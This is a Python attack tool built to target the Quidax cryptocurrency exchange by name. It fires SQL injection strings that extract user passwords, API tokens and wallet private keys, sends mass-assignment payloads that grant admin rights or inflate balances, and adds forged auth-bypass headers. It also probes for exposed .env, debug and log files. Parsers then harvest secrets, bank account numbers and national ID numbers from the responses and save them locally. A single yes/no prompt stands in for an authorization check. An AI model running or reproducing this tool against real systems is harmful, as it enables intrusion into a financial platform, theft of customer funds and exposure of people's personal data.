#!/usr/bin/env python3
"""
QUIDAX TARGETED PENETRATION SYSTEM
SPECIFICALLY BUILT FOR QUIDAX.IO NIGERIAN CRYPTO EXCHANGE
TARGETS LARAVEL PHP FRAMEWORK VULNERABILITIES
"""

import os
import sys
import json
import time
import socket
import requests
import subprocess
import threading
import multiprocessing
import concurrent.futures
import asyncio
import aiohttp
import hashlib
import base64
import re
import sqlite3
import random
import string
from pathlib import Path
from datetime import datetime
import urllib.parse
import ssl
from urllib3.exceptions import InsecureRequestWarning
import warnings

# Disable SSL warnings for stealth
warnings.filterwarnings('ignore', category=InsecureRequestWarning)

class QuidaxTargetedPenetrationSystem:
    def __init__(self):
        self.base_dir = Path.home() / "quidax_targeted_penetration"
        self.results_dir = self.base_dir / f"quidax_extraction_{int(time.time())}"
        self.results_dir.mkdir(parents=True, exist_ok=True)
        
        # Quidax-specific information from research
        self.target_info = {
            'framework': 'Laravel PHP',
            'api_base': 'https://docs.quidax.io/docs/',
            'known_endpoints': [
                '/api/v1/users', '/api/v1/wallets', '/api/v1/transactions',
                '/api/v1/deposits', '/api/v1/withdrawals', '/api/v1/trades',
                '/api/v1/markets', '/api/v1/orders', '/api/v1/accounts',
                '/api/v1/auth', '/api/v1/kyc', '/api/v1/admin'
            ],
            'technologies': ['Laravel', 'PHP', 'MySQL', 'Redis', 'Nginx'],
            'security_rating': 'DDD (37% security score)',
            'daily_volume': '$2.7M',
            'country': 'Nigeria'
        }
        
        # Laravel-specific vulnerabilities
        self.laravel_vulnerabilities = self.generate_laravel_specific_payloads()
        
        # Nigerian crypto exchange specific attacks
        self.nigerian_crypto_attacks = self.generate_nigerian_crypto_attacks()
        
        # Quidax API specific attacks
        self.quidax_api_attacks = self.generate_quidax_api_attacks()
        
        # Results tracking
        self.vulnerabilities_found = []
        self.extracted_data = []
        
    def log(self, message):
        """Enhanced logging"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_message = f"{timestamp} | {message}"
        print(log_message)
        
        log_file = self.results_dir / "quidax_targeted.log"
        with open(log_file, 'a') as f:
            f.write(f"{log_message}\n")
    
    def generate_laravel_specific_payloads(self):
        """Generate Laravel-specific vulnerability payloads"""
        self.log("🔥 GENERATING LARAVEL-SPECIFIC VULNERABILITY PAYLOADS")
        
        payloads = {
            # Laravel Mass Assignment vulnerabilities
            'mass_assignment': [
                {'role': 'admin', 'is_admin': 1, 'user_type': 'admin'},
                {'permissions': 'all', 'access_level': 'admin', 'role_id': 1},
                {'is_verified': 1, 'kyc_status': 'approved', 'account_type': 'premium'},
                {'balance': 1000000, 'wallet_balance': 999999, 'credit_limit': 999999}
            ],
            
            # Laravel Route Model Binding attacks
            'route_binding': [
                '/api/v1/users/1', '/api/v1/users/2', '/api/v1/users/admin',
                '/api/v1/wallets/1', '/api/v1/wallets/admin', '/api/v1/wallets/system',
                '/api/v1/transactions/1', '/api/v1/transactions/pending',
                '/api/v1/admin/users/1', '/api/v1/admin/settings'
            ],
            
            # Laravel Eloquent SQL Injection
            'eloquent_sql': [
                "1' OR '1'='1' --",
                "1' UNION SELECT id,email,password,role FROM users --",
                "1' UNION SELECT api_key,secret_key,permissions,1 FROM api_tokens --",
                "1' UNION SELECT private_key,wallet_address,balance,1 FROM crypto_wallets --",
                "admin' OR role='admin' --",
                "1' AND (SELECT COUNT(*) FROM users WHERE role='admin')>0 --"
            ],
            
            # Laravel Debug Mode exploitation
            'debug_mode': [
                '?debug=1', '?APP_DEBUG=true', '?LARAVEL_DEBUG=1',
                '/_debugbar', '/telescope', '/_ignition/health-check',
                '/_ignition/execute-solution', '/horizon/dashboard'
            ],
            
            # Laravel .env file exposure
            'env_exposure': [
                '/.env', '/.env.backup', '/.env.production', '/.env.local',
                '/config/.env', '/storage/.env', '/../.env', '/../../.env'
            ],
            
            # Laravel Log file exposure
            'log_exposure': [
                '/storage/logs/laravel.log', '/storage/logs/laravel-2024-01-01.log',
                '/var/log/laravel.log', '/logs/laravel.log',
                '/storage/app/logs/laravel.log'
            ],
            
            # Laravel Artisan command injection
            'artisan_injection': [
                '/artisan?command=route:list', '/artisan?command=config:show',
                '/artisan?command=env', '/artisan?command=tinker'
            ],
            
            # Laravel Session vulnerabilities
            'session_attacks': [
                {'laravel_session': 'admin_session_token'},
                {'XSRF-TOKEN': 'bypass_token'},
                {'remember_token': 'admin_remember'}
            ]
        }
        
        self.log(f"✅ Generated {sum(len(v) for v in payloads.values())} Laravel-specific payloads")
        return payloads
    
    def generate_nigerian_crypto_attacks(self):
        """Generate attacks specific to Nigerian crypto exchanges"""
        self.log("🔥 GENERATING NIGERIAN CRYPTO EXCHANGE SPECIFIC ATTACKS")
        
        attacks = {
            # Nigerian banking integration attacks
            'banking_integration': [
                '/api/v1/banks', '/api/v1/bank-accounts', '/api/v1/naira-deposits',
                '/api/v1/naira-withdrawals', '/api/v1/bank-transfers',
                '/api/v1/paystack', '/api/v1/flutterwave', '/api/v1/interswitch'
            ],
            
            # Nigerian regulatory compliance bypasses
            'regulatory_bypass': [
                '/api/v1/kyc/bypass', '/api/v1/limits/override',
                '/api/v1/compliance/disable', '/api/v1/aml/skip',
                '/api/v1/cbn-reporting/disable'
            ],
            
            # Nigerian user data patterns
            'nigerian_data': [
                {'phone': '+234', 'country': 'NG', 'currency': 'NGN'},
                {'bvn': '12345678901', 'nin': '12345678901'},
                {'bank_code': '044', 'account_number': '1234567890'}
            ],
            
            # Nigerian crypto-specific endpoints
            'crypto_endpoints': [
                '/api/v1/btc-ngn', '/api/v1/eth-ngn', '/api/v1/usdt-ngn',
                '/api/v1/p2p-trading', '/api/v1/otc-trading',
                '/api/v1/gift-cards', '/api/v1/virtual-cards'
            ],
            
            # Nigerian exchange rate manipulation
            'rate_manipulation': [
                '/api/v1/rates/btc-ngn', '/api/v1/rates/override',
                '/api/v1/pricing/admin', '/api/v1/spread/modify'
            ]
        }
        
        self.log(f"✅ Generated {sum(len(v) for v in attacks.values())} Nigerian crypto-specific attacks")
        return attacks
    
    def generate_quidax_api_attacks(self):
        """Generate Quidax API specific attacks based on documentation"""
        self.log("🔥 GENERATING QUIDAX API SPECIFIC ATTACKS")
        
        attacks = {
            # Quidax documented API endpoints
            'documented_apis': [
                '/api/v1/auth/login', '/api/v1/auth/register', '/api/v1/auth/refresh',
                '/api/v1/users/me', '/api/v1/users/profile', '/api/v1/users/settings',
                '/api/v1/wallets/create', '/api/v1/wallets/balance', '/api/v1/wallets/history',
                '/api/v1/deposits/crypto', '/api/v1/deposits/fiat', '/api/v1/deposits/status',
                '/api/v1/withdrawals/crypto', '/api/v1/withdrawals/fiat', '/api/v1/withdrawals/process',
                '/api/v1/trades/buy', '/api/v1/trades/sell', '/api/v1/trades/history',
                '/api/v1/markets/prices', '/api/v1/markets/orderbook', '/api/v1/markets/ticker'
            ],
            
            # Quidax admin/internal endpoints (guessed)
            'admin_endpoints': [
                '/api/v1/admin/users', '/api/v1/admin/wallets', '/api/v1/admin/transactions',
                '/api/v1/admin/kyc', '/api/v1/admin/compliance', '/api/v1/admin/reports',
                '/api/v1/admin/settings', '/api/v1/admin/rates', '/api/v1/admin/fees',
                '/api/v1/internal/health', '/api/v1/internal/metrics', '/api/v1/internal/logs'
            ],
            
            # Quidax webhook endpoints
            'webhook_endpoints': [
                '/webhooks/deposits', '/webhooks/withdrawals', '/webhooks/trades',
                '/webhooks/kyc', '/webhooks/compliance', '/webhooks/notifications'
            ],
            
            # Quidax API parameter attacks
            'parameter_attacks': [
                {'user_id': '1', 'admin': 'true', 'role': 'admin'},
                {'amount': '999999999', 'currency': 'BTC', 'bypass_limits': 'true'},
                {'wallet_id': 'admin', 'access_level': 'full'},
                {'transaction_id': '../../../admin', 'status': 'approved'}
            ],
            
            # Quidax authentication bypasses
            'auth_bypasses': [
                {'Authorization': 'Bearer admin_token'},
                {'X-API-Key': 'admin_api_key'},
                {'X-User-Role': 'admin'},
                {'X-Bypass-Auth': 'true'}
            ]
        }
        
        self.log(f"✅ Generated {sum(len(v) for v in attacks.values())} Quidax-specific attacks")
        return attacks
    
    async def test_laravel_mass_assignment(self, session, target):
        """Test Laravel mass assignment vulnerabilities"""
        self.log("🎯 TESTING LARAVEL MASS ASSIGNMENT VULNERABILITIES")
        
        vulnerabilities = []
        
        # Test registration endpoints with mass assignment
        registration_endpoints = [
            f"https://{target}/api/v1/auth/register",
            f"https://{target}/api/v1/users/create",
            f"https://{target}/register",
            f"https://{target}/api/register"
        ]
        
        for endpoint in registration_endpoints:
            for payload in self.laravel_vulnerabilities['mass_assignment']:
                # Add normal registration data
                registration_data = {
                    'name': 'Test User',
                    'email': f'test{random.randint(1000,9999)}@example.com',
                    'password': 'password123',
                    'password_confirmation': 'password123',
                    **payload  # Add mass assignment payload
                }
                
                try:
                    async with session.post(endpoint, json=registration_data, timeout=10, ssl=False) as response:
                        content = await response.text()
                        
                        # Check if mass assignment worked
                        if (response.status in [200, 201] and 
                            ('admin' in content.lower() or 'role' in content.lower() or 
                             'success' in content.lower())):
                            
                            self.log(f"✅ MASS ASSIGNMENT VULNERABILITY: {endpoint}")
                            self.log(f"🔍 Payload: {payload}")
                            
                            vulnerabilities.append({
                                'type': 'mass_assignment',
                                'endpoint': endpoint,
                                'payload': payload,
                                'response': content[:500],
                                'status': response.status
                            })
                            
                            # Save the response
                            vuln_file = self.results_dir / f"mass_assignment_{int(time.time())}.json"
                            with open(vuln_file, 'w') as f:
                                json.dump({
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'response': content,
                                    'status': response.status
                                }, f, indent=2)
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    async def test_laravel_debug_mode(self, session, target):
        """Test Laravel debug mode exposure"""
        self.log("🎯 TESTING LARAVEL DEBUG MODE EXPOSURE")
        
        vulnerabilities = []
        
        for debug_path in self.laravel_vulnerabilities['debug_mode']:
            test_url = f"https://{target}{debug_path}"
            
            try:
                async with session.get(test_url, timeout=10, ssl=False) as response:
                    content = await response.text()
                    
                    # Check for debug information
                    debug_indicators = [
                        'laravel', 'debugbar', 'telescope', 'ignition',
                        'app_key', 'database', 'redis', 'mail',
                        'stack trace', 'exception', 'whoops'
                    ]
                    
                    content_lower = content.lower()
                    found_indicators = [ind for ind in debug_indicators if ind in content_lower]
                    
                    if found_indicators and response.status == 200:
                        self.log(f"✅ DEBUG MODE EXPOSURE: {test_url}")
                        self.log(f"🔍 Indicators: {', '.join(found_indicators)}")
                        
                        vulnerabilities.append({
                            'type': 'debug_exposure',
                            'url': test_url,
                            'indicators': found_indicators,
                            'response_size': len(content)
                        })
                        
                        # Save debug information
                        debug_file = self.results_dir / f"debug_exposure_{int(time.time())}.html"
                        with open(debug_file, 'w') as f:
                            f.write(content)
                        
                        # Extract sensitive information from debug output
                        self.extract_debug_secrets(content)
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def extract_debug_secrets(self, debug_content):
        """Extract secrets from Laravel debug output"""
        secrets = {
            'app_keys': re.findall(r'APP_KEY["\s]*[:=]["\s]*([A-Za-z0-9+/=]+)', debug_content),
            'database_urls': re.findall(r'DATABASE_URL["\s]*[:=]["\s]*([^\s"\'<>]+)', debug_content),
            'redis_urls': re.findall(r'REDIS_URL["\s]*[:=]["\s]*([^\s"\'<>]+)', debug_content),
            'mail_passwords': re.findall(r'MAIL_PASSWORD["\s]*[:=]["\s]*([^\s"\'<>]+)', debug_content),
            'api_keys': re.findall(r'API_KEY["\s]*[:=]["\s]*([A-Za-z0-9]+)', debug_content),
            'jwt_secrets': re.findall(r'JWT_SECRET["\s]*[:=]["\s]*([A-Za-z0-9+/=]+)', debug_content)
        }
        
        found_secrets = {k: v for k, v in secrets.items() if v}
        
        if found_secrets:
            self.log(f"🔐 EXTRACTED SECRETS FROM DEBUG OUTPUT:")
            for secret_type, values in found_secrets.items():
                self.log(f"   {secret_type}: {len(values)} found")
            
            secrets_file = self.results_dir / f"debug_secrets_{int(time.time())}.json"
            with open(secrets_file, 'w') as f:
                json.dump(found_secrets, f, indent=2)
    
    async def test_env_file_exposure(self, session, target):
        """Test .env file exposure"""
        self.log("🎯 TESTING .ENV FILE EXPOSURE")
        
        vulnerabilities = []
        
        for env_path in self.laravel_vulnerabilities['env_exposure']:
            test_url = f"https://{target}{env_path}"
            
            try:
                async with session.get(test_url, timeout=10, ssl=False) as response:
                    content = await response.text()
                    
                    # Check for .env file content
                    env_indicators = [
                        'app_name=', 'app_env=', 'app_key=', 'app_debug=',
                        'db_connection=', 'db_host=', 'db_password=',
                        'redis_host=', 'mail_password=', 'jwt_secret='
                    ]
                    
                    content_lower = content.lower()
                    found_indicators = [ind for ind in env_indicators if ind in content_lower]
                    
                    if found_indicators and response.status == 200:
                        self.log(f"✅ .ENV FILE EXPOSED: {test_url}")
                        self.log(f"🔍 Contains: {', '.join(found_indicators)}")
                        
                        vulnerabilities.append({
                            'type': 'env_exposure',
                            'url': test_url,
                            'indicators': found_indicators,
                            'content_size': len(content)
                        })
                        
                        # Save .env file
                        env_file = self.results_dir / f"env_file_{int(time.time())}.txt"
                        with open(env_file, 'w') as f:
                            f.write(content)
                        
                        # Extract all secrets from .env file
                        self.extract_env_secrets(content)
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def extract_env_secrets(self, env_content):
        """Extract all secrets from .env file"""
        self.log("🔐 EXTRACTING SECRETS FROM .ENV FILE")
        
        # Parse .env file format
        secrets = {}
        for line in env_content.split('\n'):
            if '=' in line and not line.strip().startswith('#'):
                key, value = line.split('=', 1)
                key = key.strip()
                value = value.strip().strip('"\'')
                
                # Focus on sensitive keys
                sensitive_keys = [
                    'app_key', 'db_password', 'redis_password', 'mail_password',
                    'jwt_secret', 'api_key', 'secret_key', 'private_key',
                    'aws_secret', 'stripe_secret', 'paystack_secret'
                ]
                
                if any(sensitive in key.lower() for sensitive in sensitive_keys):
                    secrets[key] = value
                    self.log(f"   {key}: {value[:20]}...")
        
        if secrets:
            secrets_file = self.results_dir / f"env_secrets_{int(time.time())}.json"
            with open(secrets_file, 'w') as f:
                json.dump(secrets, f, indent=2)
    
    async def test_quidax_api_endpoints(self, session, target):
        """Test Quidax-specific API endpoints"""
        self.log("🎯 TESTING QUIDAX-SPECIFIC API ENDPOINTS")
        
        vulnerabilities = []
        
        # Test all documented and guessed endpoints
        all_endpoints = (
            self.quidax_api_attacks['documented_apis'] +
            self.quidax_api_attacks['admin_endpoints'] +
            self.quidax_api_attacks['webhook_endpoints']
        )
        
        for endpoint in all_endpoints:
            test_url = f"https://{target}{endpoint}"
            
            # Test different HTTP methods
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
            
            for method in methods:
                try:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    }
                    
                    # Add authentication bypass headers
                    for auth_bypass in self.quidax_api_attacks['auth_bypasses']:
                        headers.update(auth_bypass)
                    
                    if method == 'GET':
                        async with session.get(test_url, headers=headers, timeout=10, ssl=False) as response:
                            content = await response.text()
                    elif method == 'POST':
                        # Add parameter attacks to POST data
                        post_data = {}
                        for param_attack in self.quidax_api_attacks['parameter_attacks']:
                            post_data.update(param_attack)
                        
                        async with session.post(test_url, json=post_data, headers=headers, timeout=10, ssl=False) as response:
                            content = await response.text()
                    else:
                        continue  # Skip other methods for now
                    
                    # Analyze response for vulnerabilities
                    if response.status in [200, 201, 202]:
                        # Check for sensitive data exposure
                        sensitive_patterns = [
                            'api_key', 'secret_key', 'private_key', 'token',
                            'password', 'hash', 'wallet', 'balance',
                            'transaction', 'user', 'admin', 'database'
                        ]
                        
                        content_lower = content.lower()
                        found_patterns = [p for p in sensitive_patterns if p in content_lower]
                        
                        if found_patterns:
                            self.log(f"✅ SENSITIVE DATA EXPOSURE: {method} {test_url}")
                            self.log(f"🔍 Contains: {', '.join(found_patterns)}")
                            
                            vulnerabilities.append({
                                'type': 'api_data_exposure',
                                'method': method,
                                'url': test_url,
                                'status': response.status,
                                'patterns': found_patterns,
                                'response_size': len(content)
                            })
                            
                            # Save API response
                            api_file = self.results_dir / f"api_exposure_{method}_{int(time.time())}.json"
                            with open(api_file, 'w') as f:
                                json.dump({
                                    'method': method,
                                    'url': test_url,
                                    'status': response.status,
                                    'headers': dict(response.headers),
                                    'content': content
                                }, f, indent=2)
                            
                            # Extract specific data
                            self.extract_api_data(content, method, test_url)
                    
                    elif response.status == 403:
                        # Forbidden - endpoint exists but access denied
                        self.log(f"🔒 PROTECTED ENDPOINT FOUND: {method} {test_url}")
                        vulnerabilities.append({
                            'type': 'protected_endpoint',
                            'method': method,
                            'url': test_url,
                            'status': response.status
                        })
                
                except Exception as e:
                    continue
        
        return vulnerabilities
    
    def extract_api_data(self, content, method, url):
        """Extract sensitive data from API responses"""
        try:
            # Try to parse as JSON
            data = json.loads(content)
            
            # Look for sensitive fields
            sensitive_data = {}
            
            def extract_recursive(obj, path=""):
                if isinstance(obj, dict):
                    for key, value in obj.items():
                        current_path = f"{path}.{key}" if path else key
                        
                        # Check for sensitive keys
                        sensitive_keys = [
                            'api_key', 'secret', 'token', 'password', 'hash',
                            'private_key', 'wallet', 'balance', 'email',
                            'phone', 'bvn', 'nin', 'account_number'
                        ]
                        
                        if any(sens in key.lower() for sens in sensitive_keys):
                            sensitive_data[current_path] = value
                        
                        if isinstance(value, (dict, list)):
                            extract_recursive(value, current_path)
                
                elif isinstance(obj, list):
                    for i, item in enumerate(obj):
                        extract_recursive(item, f"{path}[{i}]")
            
            extract_recursive(data)
            
            if sensitive_data:
                self.log(f"🔐 EXTRACTED SENSITIVE DATA FROM {method} {url}:")
                for key, value in sensitive_data.items():
                    self.log(f"   {key}: {str(value)[:50]}...")
                
                data_file = self.results_dir / f"sensitive_data_{int(time.time())}.json"
                with open(data_file, 'w') as f:
                    json.dump(sensitive_data, f, indent=2)
        
        except json.JSONDecodeError:
            # Not JSON, try regex patterns
            patterns = {
                'emails': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
                'phone_numbers': r'\+234[0-9]{10}',
                'api_keys': r'[a-zA-Z0-9]{32,}',
                'bitcoin_addresses': r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}',
                'ethereum_addresses': r'0x[a-fA-F0-9]{40}'
            }
            
            found_data = {}
            for pattern_name, pattern in patterns.items():
                matches = re.findall(pattern, content)
                if matches:
                    found_data[pattern_name] = matches
                    self.log(f"🔍 Found {len(matches)} {pattern_name}")
            
            if found_data:
                data_file = self.results_dir / f"extracted_patterns_{int(time.time())}.json"
                with open(data_file, 'w') as f:
                    json.dump(found_data, f, indent=2)
    
    async def test_nigerian_banking_integration(self, session, target):
        """Test Nigerian banking integration vulnerabilities"""
        self.log("🎯 TESTING NIGERIAN BANKING INTEGRATION VULNERABILITIES")
        
        vulnerabilities = []
        
        for endpoint in self.nigerian_crypto_attacks['banking_integration']:
            test_url = f"https://{target}{endpoint}"
            
            # Test with Nigerian banking data
            banking_data = {
                'bank_code': '044',  # Access Bank
                'account_number': '1234567890',
                'bvn': '12345678901',
                'amount': 1000000,  # 1M Naira
                'currency': 'NGN'
            }
            
            try:
                async with session.post(test_url, json=banking_data, timeout=10, ssl=False) as response:
                    content = await response.text()
                    
                    if response.status in [200, 201, 202]:
                        # Check for banking integration response
                        banking_indicators = [
                            'account_name', 'bank_name', 'transfer', 'deposit',
                            'naira', 'ngn', 'paystack', 'flutterwave'
                        ]
                        
                        content_lower = content.lower()
                        found_indicators = [ind for ind in banking_indicators if ind in content_lower]
                        
                        if found_indicators:
                            self.log(f"✅ BANKING INTEGRATION EXPOSED: {test_url}")
                            self.log(f"🔍 Banking data: {', '.join(found_indicators)}")
                            
                            vulnerabilities.append({
                                'type': 'banking_integration',
                                'url': test_url,
                                'indicators': found_indicators,
                                'response_size': len(content)
                            })
                            
                            # Save banking response
                            banking_file = self.results_dir / f"banking_integration_{int(time.time())}.json"
                            with open(banking_file, 'w') as f:
                                json.dump({
                                    'url': test_url,
                                    'request_data': banking_data,
                                    'response': content,
                                    'status': response.status
                                }, f, indent=2)
            
            except Exception as e:
                continue
        
        return vulnerabilities
    
    async def run_quidax_targeted_penetration(self, target):
        """Run the complete Quidax-targeted penetration test"""
        self.log("🎯 STARTING QUIDAX TARGETED PENETRATION")
        self.log(f"Target: {target}")
        self.log(f"Framework: {self.target_info['framework']}")
        self.log(f"Security Rating: {self.target_info['security_rating']}")
        self.log("=" * 60)
        
        start_time = time.time()
        
        # Setup async session
        connector = aiohttp.TCPConnector(limit=50, ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        
        all_vulnerabilities = []
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            # Run all targeted tests in parallel
            tasks = [
                self.test_laravel_mass_assignment(session, target),
                self.test_laravel_debug_mode(session, target),
                self.test_env_file_exposure(session, target),
                self.test_quidax_api_endpoints(session, target),
                self.test_nigerian_banking_integration(session, target)
            ]
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Combine all results
            for result in results:
                if isinstance(result, list):
                    all_vulnerabilities.extend(result)
        
        # Compile final results
        total_time = time.time() - start_time
        
        final_results = {
            'target': target,
            'target_info': self.target_info,
            'timestamp': datetime.now().isoformat(),
            'execution_time': total_time,
            'vulnerabilities_found': all_vulnerabilities,
            'vulnerability_count': len(all_vulnerabilities),
            'vulnerability_types': list(set(v.get('type', 'unknown') for v in all_vulnerabilities))
        }
        
        # Save results
        results_file = self.results_dir / f"QUIDAX_TARGETED_RESULTS_{target}.json"
        with open(results_file, 'w') as f:
            json.dump(final_results, f, indent=2)
        
        self.log("✅ QUIDAX TARGETED PENETRATION COMPLETE")
        self.log(f"📁 Results saved: {results_file}")
        self.log(f"⏱️ Total execution time: {total_time:.2f} seconds")
        
        # Summary
        self.log("=" * 60)
        self.log("📊 QUIDAX TARGETED PENETRATION SUMMARY:")
        self.log(f"   Total vulnerabilities found: {len(all_vulnerabilities)}")
        
        # Group by vulnerability type
        vuln_types = {}
        for vuln in all_vulnerabilities:
            vuln_type = vuln.get('type', 'unknown')
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
        
        for vuln_type, count in vuln_types.items():
            self.log(f"   {vuln_type}: {count}")
        
        self.log(f"   Files extracted: {len(list(self.results_dir.glob('*')))}")
        self.log(f"   Target-specific attacks: Laravel + Nigerian crypto exchange")
        
        return final_results

def main():
    print("🎯 QUIDAX TARGETED PENETRATION SYSTEM")
    print("SPECIFICALLY BUILT FOR QUIDAX.IO NIGERIAN CRYPTO EXCHANGE")
    print("TARGETS LARAVEL PHP FRAMEWORK VULNERABILITIES")
    print("=" * 60)
    
    if len(sys.argv) != 2:
        print("Usage: python3 QUIDAX_TARGETED_PENETRATION_SYSTEM.py <target>")
        print("Example: python3 QUIDAX_TARGETED_PENETRATION_SYSTEM.py quidax.io")
        sys.exit(1)
    
    target = sys.argv[1].replace('http://', '').replace('https://', '').strip('/')
    
    print(f"⚠️ QUIDAX TARGETED PENETRATION ON: {target}")
    print("⚠️ This system targets:")
    print("   - Laravel PHP framework vulnerabilities")
    print("   - Nigerian crypto exchange specific attacks")
    print("   - Quidax API endpoint vulnerabilities")
    print("   - Banking integration weaknesses")
    print("   - Mass assignment and debug mode exposure")
    confirm = input("Do you have written authorization? (yes/no): ").strip().lower()
    
    if confirm != "yes":
        print("❌ Authorization required for penetration testing")
        sys.exit(1)
    
    # Install required packages
    print("📦 Installing required packages...")
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install', 'aiohttp', '--break-system-packages'], 
                     check=True, capture_output=True)
    except:
        print("⚠️ Failed to install aiohttp - continuing anyway")
    
    system = QuidaxTargetedPenetrationSystem()
    
    # Run the targeted penetration test
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        results = loop.run_until_complete(system.run_quidax_targeted_penetration(target))
    finally:
        loop.close()
    
    print("\n🎉 QUIDAX TARGETED PENETRATION COMPLETED")
    print("✅ Laravel-specific vulnerabilities tested")
    print("✅ Nigerian crypto exchange attacks executed")
    print("✅ Quidax API endpoints analyzed")
    print("✅ Banking integration vulnerabilities checked")
    print(f"📁 Check all results in: {system.results_dir}")
    
    if results['vulnerability_count'] > 0:
        print(f"\n🚨 FOUND {results['vulnerability_count']} VULNERABILITIES!")
        print("🔍 Check the results directory for detailed information")
    else:
        print("\n⚠️ No vulnerabilities found - target may be properly secured")

if __name__ == "__main__":
    main()